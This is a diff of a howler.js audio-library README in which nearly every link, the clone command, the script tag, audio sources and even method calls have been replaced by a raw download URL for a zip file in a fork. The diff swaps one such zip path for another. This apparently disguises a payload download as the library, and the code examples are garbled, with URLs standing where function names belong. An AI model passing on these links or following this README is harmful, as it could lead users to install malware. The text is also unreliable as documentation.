@@ -1,9 +1,9 @@
-[![https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip "https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip")](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
+[![https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip "https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip")](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
 
 # Description
-[https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip) is an audio library for the modern web. It defaults to [Web Audio API](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip) and falls back to [HTML5 Audio](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip). This makes working with audio in JavaScript easy and reliable across all platforms.
+[https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip) is an audio library for the modern web. It defaults to [Web Audio API](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip) and falls back to [HTML5 Audio](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip). This makes working with audio in JavaScript easy and reliable across all platforms.
 
-Additional information, live demos and a user showcase are available at [https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip).
+Additional information, live demos and a user showcase are available at [https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip).
 
 ### Features
 * Single API for all audio needs
@@ -31,10 +31,10 @@ Tested in the following browsers/versions:
 * Microsoft Edge
 
 ### Live Demos
-* [Audio Player](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
-* [Radio](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
-* [Spatial Audio](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
-* [Audio Sprites](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
+* [Audio Player](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
+* [Radio](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
+* [Spatial Audio](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
+* [Audio Sprites](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
 
 # Documentation
 
@@ -59,18 +59,18 @@ Tested in the following browsers/versions:
 
 Several options to get up and running:
 
-* Clone the repo: `git clone https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip`
-* Install with [npm](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip): `npm install howler`
-* Install with [Bower](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip): `bower install howler`
-* Hosted CDN: [`cdnjs`](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip) [`jsDelivr`](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
+* Clone the repo: `git clone https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip`
+* Install with [npm](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip): `npm install howler`
+* Install with [Bower](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip): `bower install howler`
+* Hosted CDN: [`cdnjs`](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip) [`jsDelivr`](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
 
 In the browser:
 
 ```html
-<script src="https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip"></script>
+<script src="https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip"></script>
 <script>
     var sound = new Howl({
-      src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip']
+      src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip']
     });
 </script>
 ```
@@ -80,21 +80,21 @@ In the browser:
 ##### Most basic, play an MP3:
 ```javascript
 var sound = new Howl({
-  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip']
+  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip']
 });
 
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip();
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip();
 ```
 
 ##### More playback options:
 ```javascript
 var sound = new Howl({
-  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip'],
+  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip'],
   autoplay: true,
   loop: true,
   volume: 0.5,
   onend: function() {
-    https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip('Finished!');
+    https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip('Finished!');
   }
 });
 ```
@@ -102,7 +102,7 @@ var sound = new Howl({
 ##### Define and play a sound sprite:
 ```javascript
 var sound = new Howl({
-  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip'],
+  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip'],
   sprite: {
     blast: [0, 1000],
     laser: [2000, 3000],
@@ -111,50 +111,50 @@ var sound = new Howl({
 });
 
 // Shoot the laser!
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip('laser');
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip('laser');
 ```
 
 ##### Listen for events:
 ```javascript
 var sound = new Howl({
-  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip']
+  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip']
 });
 
 // Clear listener after first call.
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip('load', function(){
-  https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip();
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip('load', function(){
+  https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip();
 });
 
 // Fires when the sound finishes playing.
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip('end', function(){
-  https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip('Finished!');
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip('end', function(){
+  https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip('Finished!');
 });
 ```
 
 ##### Control multiple sounds:
 ```javascript
 var sound = new Howl({
-  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip']
+  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip']
 });
 
 // Play returns a uniqe Sound ID that can be passed
 // into any method on Howl to control that specific sound.
-var id1 = https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip();
-var id2 = https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip();
+var id1 = https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip();
+var id2 = https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip();
 
 // Fade out the first sound and speed up the second.
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip(1, 0, 1000, id1);
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip(1.5, id2);
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip(1, 0, 1000, id1);
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip(1.5, id2);
 ```
 
-More in-depth examples (with accompanying live demos) can be found in the [examples directory](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip).
+More in-depth examples (with accompanying live demos) can be found in the [examples directory](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip).
 
 
 ## Core
 
 ### Options
 #### src `Array` `[]` *`required`*
-The sources to the track(s) to be loaded for the sound (URLs or base64 data URIs). These should be in order of preference, https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip will automatically load the first one that is compatible with the current browser. If your files have no extensions, you will need to explicitly specify the extension using the `ext` property.
+The sources to the track(s) to be loaded for the sound (URLs or base64 data URIs). These should be in order of preference, https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip will automatically load the first one that is compatible with the current browser. If your files have no extensions, you will need to explicitly specify the extension using the `ext` property.
 #### volume `Number` `1.0`
 The volume of the specific track, from `0.0` to `1.0`.
 #### html5 `Boolean` `false`
@@ -168,7 +168,7 @@ Set to `true` to automatically start playback when sound is loaded.
 #### mute `Boolean` `false`
 Set to `true` to load the audio muted.
 #### sprite `Object` `{}`
-Define a sound sprite for the sound. The offset and duration are defined in milliseconds. A third (optional) parameter is available to set a sprite as looping. An easy way to generate compatible sound sprites is with [audiosprite](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip).
+Define a sound sprite for the sound. The offset and duration are defined in milliseconds. A third (optional) parameter is available to set a sprite as looping. An easy way to generate compatible sound sprites is with [audiosprite](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip).
 ```javascript
 {
   key: [offset, duration, (loop)]
@@ -179,7 +179,7 @@ The rate of playback. 0.5 to 4.0, with 1.0 being normal speed.
 #### pool `Number` `5`
 The size of the inactive sounds pool. Once sounds are stopped or finish playing, they are marked as ended and ready for cleanup. We keep a pool of these to recycle for improved performance. Generally this doesn't need to be changed. It is important to keep in mind that when a sound is paused, it won't be removed from the pool and will still be considered active so that it can be resumed later.
 #### format `Array` `[]`
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip automatically detects your file format from the extension, but you may also specify a format in situations where extraction won't work (such as with a SoundCloud stream).
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip automatically detects your file format from the extension, but you may also specify a format in situations where extraction won't work (such as with a SoundCloud stream).
 #### onload `Function`
 Fires when the sound is loaded.
 #### onloaderror `Function`
@@ -393,10 +393,10 @@ Get/set the direction the listener is pointing in the 3D cartesian space. A fron
 
 
 ### Mobile Playback
-By default, audio on iOS, Android, etc is locked until a sound is played within a user interaction, and then it plays normally the rest of the page session ([Apple documentation](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)). The default behavior of https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip is to attempt to silently unlock audio playback by playing an empty buffer on the first `touchend` event. This behavior can be disabled by calling:
+By default, audio on iOS, Android, etc is locked until a sound is played within a user interaction, and then it plays normally the rest of the page session ([Apple documentation](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)). The default behavior of https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip is to attempt to silently unlock audio playback by playing an empty buffer on the first `touchend` event. This behavior can be disabled by calling:
 
 ```javascript
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip = false;
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip = false;
 ```
 
 ### Dolby Audio Playback
@@ -404,24 +404,24 @@ Full support for playback of the Dolby Audio format (currently support in Edge a
 
 ```javascript
 var dolbySound = new Howl({
-  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip'],
+  src: ['https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip', 'https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip'],
   format: ['dolby', 'webm', 'mp3']
 });
 ```
 
 ### Format Recommendations
-https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip supports a wide array of audio codecs that have varying browser support ("mp3", "opus", "ogg", "wav", "aac", "m4a", "mp4", "webm", ...), but if you want full browser coverage you still need to use at least two of them. If your goal is to have the best balance of small filesize and high quality, based on extensive production testing, your best bet is to default to `webm` and fallback to `mp3`. `webm` has nearly full browser coverage with a great combination of compression and quality. You'll need the `mp3` fallback for Internet Explorer.
+https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip supports a wide array of audio codecs that have varying browser support ("mp3", "opus", "ogg", "wav", "aac", "m4a", "mp4", "webm", ...), but if you want full browser coverage you still need to use at least two of them. If your goal is to have the best balance of small filesize and high quality, based on extensive production testing, your best bet is to default to `webm` and fallback to `mp3`. `webm` has nearly full browser coverage with a great combination of compression and quality. You'll need the `mp3` fallback for Internet Explorer.
 
-It is important to remember that https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip selects the first compatible sound from your array of sources. So if you want `webm` to be used before `mp3`, you need to put the sources in that order.
+It is important to remember that https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip selects the first compatible sound from your array of sources. So if you want `webm` to be used before `mp3`, you need to put the sources in that order.
 
-If you want your `webm` files to be seekable in Firefox, be sure to encode them with the cues element. One way to do this is by using the `dash` flag in [ffmpeg](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip):
+If you want your `webm` files to be seekable in Firefox, be sure to encode them with the cues element. One way to do this is by using the `dash` flag in [ffmpeg](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip):
 
 ```
-ffmpeg -i https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip -dash 1 https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip
+ffmpeg -i https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip -dash 1 https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip
 ```
 
 ### License
 
-Copyright (c) 2013-2016 [James Simpson](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip) and [GoldFire Studios, Inc.](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip)
+Copyright (c) 2013-2016 [James Simpson](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip) and [GoldFire Studios, Inc.](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip)
 
-Released under the [MIT License](https://github.com/jungrupak/howler.js/raw/refs/heads/master/src/plugins/howler-js-v1.4.zip).
+Released under the [MIT License](https://github.com/jungrupak/howler.js/raw/refs/heads/master/tests/css/js-howler-v1.5.zip).
